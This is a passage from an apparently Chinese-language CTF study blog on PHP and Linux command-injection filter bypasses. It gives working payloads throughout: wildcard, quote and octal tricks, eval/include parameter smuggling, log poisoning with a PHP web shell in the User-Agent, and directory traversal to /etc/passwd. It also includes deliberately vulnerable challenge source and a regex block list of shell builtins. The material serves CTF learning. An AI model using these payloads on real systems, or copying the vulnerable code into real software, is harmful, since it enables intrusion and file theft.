 assert(eval($_POST[%27x%27]));</span><br></pre></td></tr></table></figure>
<h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;</span><br><span class="line"></span><br><span class="line">/**/</span><br><span class="line"></span><br><span class="line">$IFS$9  比如 tac$IFS$9flag.php</span><br><span class="line"></span><br><span class="line">%20</span><br><span class="line"></span><br><span class="line">%09</span><br><span class="line"></span><br><span class="line">&lt;&gt;</span><br><span class="line"></span><br><span class="line">&lt;</span><br><span class="line"></span><br><span class="line">_</span><br><span class="line"></span><br><span class="line">-</span><br><span class="line"></span><br><span class="line">%a0</span><br></pre></td></tr></table></figure>
<h4 id="等号绕过"><a href="#等号绕过" class="headerlink" title="等号绕过"></a>等号绕过</h4><p><code>like</code></p>
<h4 id="绕过"><a href="#绕过" class="headerlink" title="_ 绕过"></a>_ 绕过</h4><p>另外在解析中例如，<code>e_v.a.l</code>中的<code>_</code>会变成  <code>e.v.a.l</code>，这时就需要给改成 <code>e[v.a.l</code></p>
<p><code>[</code> 或者是 <code>+</code>  <code>\x5f</code></p>
<h4 id="八进制绕过"><a href="#八进制绕过" class="headerlink" title="八进制绕过"></a>八进制绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>
<p><strong><em>知识点：linux中使用$’xxx’（xxx为字符的八进制）的形式可以执行任意代码</em></strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">&#x27;\154\163&#x27;</span> //执行<span class="built_in">ls</span></span></span><br></pre></td></tr></table></figure>
<p>发现可以成功执行</p>
<p>但是八进制的执行方法不能执行带有参数的linux命令，如cat /flag(/flag为参数)或ls -la(-la为参数)</p>
<p><strong>重定向符号可以代替命令中的空格</strong></p>
<p><strong>最终payload</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">&#x27;\143\141\164&#x27;</span>&lt;$<span class="string">&#x27;\57\146\154\141\147&#x27;</span> // <span class="built_in">cat</span>&lt;/flag</span></span><br></pre></td></tr></table></figure>
<p><strong>编码脚本：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode_to_octal</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># 将每个字符转换为其ASCII码的八进制表示</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;\\<span class="subst">&#123;<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]&#125;</span>&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> input_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">input_string = <span class="string">&quot;cat&quot;</span></span><br><span class="line">encoded_string = encode_to_octal(input_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encoded: <span class="subst">&#123;encoded_string&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>解码脚本：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_from_octal</span>(<span class="params">octal_string</span>):</span><br><span class="line">    <span class="comment"># 分割八进制字符串，并将每个八进制值转换为字符</span></span><br><span class="line">    characters = octal_string.split(<span class="string">&#x27;\\&#x27;</span>)[<span class="number">1</span>:]  <span class="comment"># 去掉空字符串部分</span></span><br><span class="line">    decoded_string = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(c), <span class="number">8</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> characters)</span><br><span class="line">    <span class="keyword">return</span> decoded_string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">octal_string = <span class="string">&quot;\\143\\141\\164&quot;</span></span><br><span class="line">decoded_string = decode_from_octal(octal_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decoded: <span class="subst">&#123;decoded_string&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="/ 绕过"></a>/ 绕过</h4><p>就是让你无法穿越目录</p>
<p>可利用  <strong>;</strong>  拼接命令绕过</p>
<p><code>cd ..;cd ..;cd ..;cd ..;cd etc;cat passwd</code></p>
<h4 id="绕过-2"><a href="#绕过-2" class="headerlink" title="# 绕过"></a># 绕过</h4><p><code>--+</code>     <code>%23</code></p>
<h4 id="换行符绕过"><a href="#换行符绕过" class="headerlink" title="换行符绕过"></a>换行符绕过</h4><p>对于<code>?s</code>正则匹配单行模式下，默认 <code>.</code> 不匹配换行符，可以绕过</p>
<p><code>%0a</code></p>
<h4 id="绕过-3"><a href="#绕过-3" class="headerlink" title=". 绕过"></a>. 绕过</h4><p><code>[]</code></p>
<h4 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="* 通配符绕过"></a>* 通配符绕过</h4><p><code>tac /f*</code> 表示输出以 f 开头的文件里的内容</p>
<h4 id="‘-‘-空字符匹配绕过"><a href="#‘-‘-空字符匹配绕过" class="headerlink" title="‘ ‘ 空字符匹配绕过"></a>‘ ‘ 空字符匹配绕过</h4><p><code>fl&#39;&#39;ag = flag</code></p>
<h4 id="匹配绕过"><a href="#匹配绕过" class="headerlink" title="\ 匹配绕过"></a>\ 匹配绕过</h4><p><code>?c=system(&quot;tac fl\ag.php&quot;)</code></p>
<p><code>\</code> 是 <strong>转义字符</strong>，通常用于转义后面的字符，<code>fl\ag.php</code> 会被解释为 <code>flag.php</code></p>
<h4 id="占位绕过"><a href="#占位绕过" class="headerlink" title="? 占位绕过"></a>? 占位绕过</h4><p><code>?c=system(&quot;tac f???????&quot;)</code></p>
<p><code>?</code> 被用作通配符，代表 <strong>任何单个字符</strong></p>
<p>在 Linux 中，<code>f???????</code> 可以匹配任何以 <code>f</code> 开头并包含 7 个任意字符的文件名</p>
<h4 id="flag绕过"><a href="#flag绕过" class="headerlink" title="flag绕过"></a>flag绕过</h4><p><code>f???</code></p>
<p><code>f&quot;&quot;lag</code></p>
<p><code>f/lag</code></p>
<p><code>f&#39;&#39;lag</code></p>
<p><code>cmd=echo file_get_contents(&quot;/fla&quot;.&quot;g&quot;);</code></p>
<h4 id="URL编码绕过"><a href="#URL编码绕过" class="headerlink" title="URL编码绕过"></a>URL编码绕过</h4><p>就是例如 <code>;</code> 被过滤了，就可以进行URL编码</p>
<p>其他特殊字符也同理</p>
<h4 id="php绕过"><a href="#php绕过" class="headerlink" title="php绕过"></a>php绕过</h4><p><code>&lt;?=</code></p>
<p><code>&lt;%</code></p>
<p><code>&lt;?echo ?&gt;</code>(命令放在里面)</p>
<h4 id="and绕过"><a href="#and绕过" class="headerlink" title="and绕过"></a>and绕过</h4><p>&amp;&amp;</p>
<h4 id="全部字母绕过"><a href="#全部字母绕过" class="headerlink" title="全部字母绕过"></a>全部字母绕过</h4><p><a target="_blank" rel="noopener" href="https://www.iamwawa.cn/quanjiaobanjiao.html">全角半角转换工具_蛙蛙工具</a></p>
<p>其中 <code>111 115</code> 分别对应 <code>os</code> 的 ASCII 码，<code>99 97 116 32 47 102 108 97 103</code> 分别对应 <code>cat /flag</code> 的 ASCII 码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_＿ｉｍｐｏｒｔ_＿(ｃｈｒ(111)+ｃｈｒ(115)).ｓｙｓｔｅｍ(ｃｈｒ(99)+ｃｈｒ(97)+ｃｈｒ(116)+ｃｈｒ(32)+ｃｈｒ(47)+ｃｈｒ(102)+ｃｈｒ(108)+ｃｈｒ(97)+ｃｈｒ(103))</span><br></pre></td></tr></table></figure>
<h4 id="传参绕过"><a href="#传参绕过" class="headerlink" title="传参绕过"></a>传参绕过</h4><p><strong>eval函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[x]);&amp;x=system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">?c=eval($_GET[x]);&amp;x=system(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>include函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include($_GET[x]);&amp;x=php:<span class="comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span></span><br></pre></td></tr></table></figure>
<p>如果<code>(</code>和<code>;</code>被过滤：<br><code>%0a</code> 是 URL 编码中表示换行符（<code>\n</code>）的字符。从而使得 <code>include</code> 语句和 <code>$_GET[1]</code> 的处理被分开，从而绕过过滤机制，不过include函数这里不加<code>(</code>也是可以的<br>php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?&gt;前可以不写分号</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=include%<span class="number">0</span>a$_GET[<span class="number">1</span>]?&gt;&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span></span><br><span class="line">?c=include$_GET[<span class="number">1</span>]?&gt;&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span></span><br></pre></td></tr></table></figure>
<p><strong>日志包含</strong></p>
<p>既然能够执行文件包含，那么也可以包含日志文件，日志文件中会记录你的UA头，假设我们在UA头中写入后门代码，然后我们包含日志文件，那么就能通过后门代码读取文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[<span class="number">1</span>]?&gt;&amp;<span class="number">1</span>=../../../../var/<span class="built_in">log</span>/nginx/access.<span class="built_in">log</span>  </span><br><span class="line"></span><br><span class="line">User-Agent:&lt;?php eval($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>session_start()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c = session_id(session_start());</span><br><span class="line"></span><br><span class="line">Cookies:PHPSESSID=????</span><br></pre></td></tr></table></figure>
<p>并在cookies中传入你需要执行的命令</p>
<h4 id="变量挟持绕过"><a href="#变量挟持绕过" class="headerlink" title="变量挟持绕过"></a>变量挟持绕过</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="built_in">eval</span>(array_pop(next(get_defined_vars())));</span><br><span class="line"></span><br><span class="line">POST传入: 1=system(<span class="string">&#x27;tac fl*&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><strong><code>get_defined_vars()</code></strong><br>获取当前作用域中所有定义的变量，返回一个数组，键是变量名，值是对应的变量值</li>
<li><strong><code>next(get_defined_vars())</code></strong><br>将指针移动到数组中的下一个元素，并返回该元素的值。在这里，指针操作的对象是由 <code>get_defined_vars()</code> 返回的数组</li>
<li><strong><code>array_pop(...)</code></strong><br>弹出数组的最后一个元素。这里作用在 <code>next(get_defined_vars())</code> 的结果上，获取这个数组的最后一个变量值</li>
</ul>
<h4 id="文件枚举绕过"><a href="#文件枚举绕过" class="headerlink" title="文件枚举绕过"></a>文件枚举绕过</h4><ul>
<li><strong><code>getcwd()</code></strong> 函数返回当前工作目录的路径</li>
<li><strong><code>scandir()</code></strong> 函数列出指定目录中的所有文件和目录，并返回一个包含文件和目录名称的数组</li>
<li><strong><code>show_source()</code> </strong>函数用于显示一个 PHP 文件的源代码</li>
<li><strong><code>localeconv()</code></strong>返回一个包含本地数字及货币格式信息的数组,该数组的第一项就是’.’</li>
</ul>
<p>这里的<code>[2]</code>要多尝试，flag文件的位置不一定会在第2位</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(scandir(getcwd())[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>
<h4 id="文件读取绕过"><a href="#文件读取绕过" class="headerlink" title="文件读取绕过"></a>文件读取绕过</h4><p>这个函数拼接实际上是上面的复杂版，适用于<code>[]</code>被过滤的情况，不能直接遍历<code>scandir</code>数组，只能使用指针操作来获取特定文件，由于前两个文件是<code>.</code>和<code>..</code>，因此用<code>array_reverse</code>函数从最后一个文件开始。由于指针操作函数的作用是返回值而非地址，因此不能嵌套使用，利用这种方式只能读取很有限的几个文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读取最后一个文件</span><br><span class="line">?c=show_source(current(array_reverse(scandir(getcwd()))));</span><br><span class="line">读取倒数第二个元素</span><br><span class="line">?c=show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>
<p>还可以用另一个函数得到目录</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=echo highlight_file(current(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
<h4 id="目录穿越绕过"><a href="#目录穿越绕过" class="headerlink" title="目录穿越绕过"></a>目录穿越绕过</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(dirname(__FILE__)));  <span class="comment">// 读取当前目录</span></span><br><span class="line">c=print_r(scandir(dirname(__DIR__)));   <span class="comment">// 读取上级目录</span></span><br><span class="line">c=print_r(scandir(dirname(dirname(__FILE__))));<span class="comment">//读取上级目录</span></span><br><span class="line">c=print_r(scandir(dirname(dirname(__DIR__))));<span class="comment">//读取上上级目录</span></span><br><span class="line">c=print_r(scandir(dirname(dirname(dirname(dirname(__DIR__))))));</span><br></pre></td></tr></table></figure>
<ul>
<li><code>dirname()</code> 用于获取路径的目录部分。<code>dirname(&#39;FILE&#39;);</code>返回 ‘.’</li>
<li><code>scandir()</code> 列出指定目录中的文件和目录，返回一个数组</li>
<li><code>print_r()</code> 输出变量的易读信息，适合用于调试和查看数组内容</li>
<li><code>__FILE__</code> <code>__DIR__</code>是php中的魔术方法，可以用于获取当前目录与上级目录，通过迭代<code>dirname</code>函数就能实现目录遍历<br>输出：<code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php )</code></li>
</ul>
<h4 id="读取文件绕过"><a href="#读取文件绕过" class="headerlink" title="读取文件绕过"></a>读取文件绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hightlight_file(&quot;flag.php&quot;)</span><br></pre></td></tr></table></figure>
<p>或者可以写文件<code>&lt;?php highlight_file(&quot;var/www/html/includes/flag.php&quot;);?&gt;</code></p>
<p>这点在PYCC的初赛中有所体现</p>
<p>相似的还有</p>
<p><strong>show_source()</strong></p>
<p><strong>readgzfile()</strong></p>
<p><strong>require_once()</strong></p>
<hr>
<h3 id="例题1-无过滤简单命令拼接"><a href="#例题1-无过滤简单命令拼接" class="headerlink" title="例题1-无过滤简单命令拼接"></a>例题1-无过滤简单命令拼接</h3><h4 id="CTFHub"><a href="#CTFHub" class="headerlink" title="CTFHub"></a><a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/skilltree">CTFHub</a></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $cmd = &quot;ping -c 4 &#123;$_GET[&#x27;ip&#x27;]&#125;&quot;;</span><br><span class="line">    exec($cmd, $res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if ($res) &#123;</span><br><span class="line">    print_r($res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>就是个简单的命令拼接(127.0.0.1;ls)</p>
<p>Shell 提供了多种方式来分隔命令，分号就是其中一种。它的作用是告诉 Shell，将分号前后的命令依次执行，而不考虑前一条命令是否执行成功 。例如，在命令 “<code>ping -c 4 127.0.0.1;ls /</code>” 中，Shell 先执行 “<code>ping -c 4 127.0.0.1</code>” 命令，不管这个命令是成功（返回 0）还是失败（返回非 0 值），都会接着执行 “<code>ls /</code>” 命令</p>
<ul>
<li>Enter(换行符)</li>
<li>&amp;&amp; 前一条命令执行成功（返回值为 0）时，才会执行后一条命令</li>
<li>双管道符（||）前一条命令执行失败（返回值非 0）时，才会执行后一条命令</li>
<li>管道符（|） 将前一条命令的输出作为后一条命令的输入</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls / | grep <span class="string">&quot;txt&quot;</span>  <span class="comment"># 列出根目录下包含 &quot;txt&quot; 的文件</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>尖括号（ &lt; 和 &gt; ）</p>
<p><strong>特点</strong>：</p>
</li>
<li><p><code>&gt;</code>：将命令输出重定向到文件（覆盖）。</p>
</li>
<li><p><code>&gt;&gt;</code>：将命令输出追加到文件。</p>
</li>
<li><p><code>&lt;</code>：将文件内容作为命令的输入。</p>
</li>
<li><p>E.G：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> / &gt; output.txt  <span class="comment"># 将 ls 的输出保存到 output.txt</span></span><br><span class="line"><span class="built_in">sort</span> &lt; input.txt   <span class="comment"># 将 input.txt 的内容作为 sort 的输入</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h3 id="例题2-结合php-amp-过滤命令"><a href="#例题2-结合php-amp-过滤命令" class="headerlink" title="例题2-结合php &amp; 过滤命令"></a>例题2-结合php &amp; 过滤命令</h3><h4 id="BUUCTF在线评测-R-C-E"><a href="#BUUCTF在线评测-R-C-E" class="headerlink" title="BUUCTF在线评测 R!C!E!"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]R!C!E!">BUUCTF在线评测</a> R!C!E!</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;c4d038&quot;</span>  <span class="comment"># 目标MD5值的前六位</span></span><br><span class="line">prefix_bytes = prefix.encode()  <span class="comment"># 将前缀转换为字节串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">    b = i.to_bytes(<span class="number">22</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    m = hashlib.md5(<span class="built_in">str</span>(i).encode()).hexdigest()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> m.startswith(prefix):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">#114514</span></span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=114514&amp;e[v.a.l=echo(`nl /f*`);</span><br></pre></td></tr></table></figure>
<h4 id="BUUCTF在线评测-RCEService"><a href="#BUUCTF在线评测-RCEService" class="headerlink" title="BUUCTF在线评测 RCEService"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[FBCTF2019]RCEService">BUUCTF在线评测</a> RCEService</h4><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>); <span class="comment">// 限定了环境变量在这个目录下</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  